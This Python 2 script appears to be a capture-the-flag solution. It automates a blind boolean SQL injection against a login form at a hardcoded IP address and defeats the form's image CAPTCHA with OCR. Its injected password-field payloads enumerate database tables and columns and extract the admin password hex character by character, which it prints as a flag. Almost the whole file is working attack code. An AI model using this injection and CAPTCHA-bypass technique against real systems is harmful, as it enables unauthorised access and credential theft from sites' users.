from PIL import Image
import base64
import pytesseract
import cStringIO
import requests
import hashlib
import string


def solcapt(imgstring):
    imgstring = imgstring.split('base64,')[-1].strip()
    pic = cStringIO.StringIO()
    image_string = cStringIO.StringIO(base64.b64decode(imgstring))
    image = Image.open(image_string)
    bg = Image.new("RGB", image.size, (255, 255, 255))
    bg.paste(image)
    return pytesseract.image_to_string(bg)


def md5(textstring):
    result = hashlib.md5()
    result.update(textstring.encode('utf-8'))
    return result.hexdigest()


def check(query, i):
    # query=query+str(i)+"-- -"
    query = query + str(i) + "'),1,1))=49-- -"
    while 1:
        magic_hash = "528b90904cba26f9f4418839c7815bea"
        r = requests.get('http://125.235.240.166:5000/')
        a = (r.text).index('data:image')
        b = r.text.index("'/>")
        x = solcapt(r.text[a:b])
        # print query
        # query="1' or ascii(substring((Select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<="+str(i)+"-- -"
        r2 = requests.post('http://125.235.240.166:5000/', cookies=r.cookies,
                           data={'username': 'admin', 'password': query, 'captcha': x})
        if "Dang nhap khong thanh cong" in r2.text:
            return 0
        if md5(r2.text) == magic_hash:
            return 1


def main():
    a = ''
    st = '0123456789abcdef'
    for i in range(1, 153):
        # query1="1' or ascii(substring((Select table_name from information_schema.tables where table_schema=database() limit 1,2),"+str(i)+",1))="
        # query2="1' or ascii(substring((Select table_name from information_schema.tables where table_schema=database() limit 1,2),"+str(i)+",1))<"
        # query1="1' or ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='us3r' limit 1,2),"+str(i)+",1))="
        # query2="1' or ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='us3r' limit 1,2),"+str(i)+",1))<"
        query1 = "1' or ascii(substring((select 1 from dual where us3r.usernam3 = 'admin' and mid(hex(us3r.password)," + str(
            i) + ",1) = '"

        # query1="1' or ascii(substring((select 1 from dual where us3r.usernam3='admin' and mid(length(hex(us3r.password)),"+str(i)+",1)='"
        for j in st:
            if check(query1, j):
                a += str(j)
                print a
                break

    print
    "Flag: ", a.replace('00', '').decode('hex')


'''
		l=0
  		r=128
  		mid=0
    		while (l < r):
			#print i,l,r,mid
        		mid = (l + r) / 2
        		if check(query1,mid):
        			print str(unichr(mid))
				a+=str(unichr(mid))
				break
        		elif (check(query2,mid)):
        			r = mid - 1
        		else:
        			l = mid + 1
		if l<r:
			if mid == 0:
				break
			continue
    		if check(query1,l):
			if l == 0:
				break
    			print str(unichr(l))
			a+=str(unichr(l))
    		else:
    			break
'''
if __name__ == '__main__':
    main()